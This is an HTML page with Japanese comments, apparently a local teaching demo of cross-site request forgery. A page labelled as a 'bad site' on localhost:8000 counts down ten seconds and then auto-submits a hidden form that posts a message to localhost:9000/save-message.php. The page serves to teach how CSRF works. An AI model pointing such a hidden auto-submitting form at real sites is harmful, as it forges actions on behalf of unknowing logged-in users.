

<h1>このサイトは<span id="timer"></span>秒後にPOSTリクエストを送信します。</h1>
<!-- 隠されたフォーム -->

<form id="hidden-form" action="http://localhost:9000/save-message.php" method="POST" style="display:none;">
    <input type="hidden" name="username" value="悪いサイト localhost:8000">
    <input type="hidden" name="message" value="悪いサイトから送信されたメッセージです">
    <input type="submit">
</form>
<script>

    /* DOMを読みこんで10秒後にリクエスト送信 */
    document.addEventListener("DOMContentLoaded", function() {
        let TIME_LEFT = 10;
        const timer = document.getElementById("timer");
        timer.innerHTML = TIME_LEFT;
        const interval = setInterval(() => {
            TIME_LEFT -= 1;
            timer.innerHTML = TIME_LEFT;

        }, 1000);
        setTimeout(function() {
            clearInterval(interval);
            /* ここを切り替えて送信先を変更  */

            document.getElementById("hidden-form").submit();
        }, 10000)

    })

</script>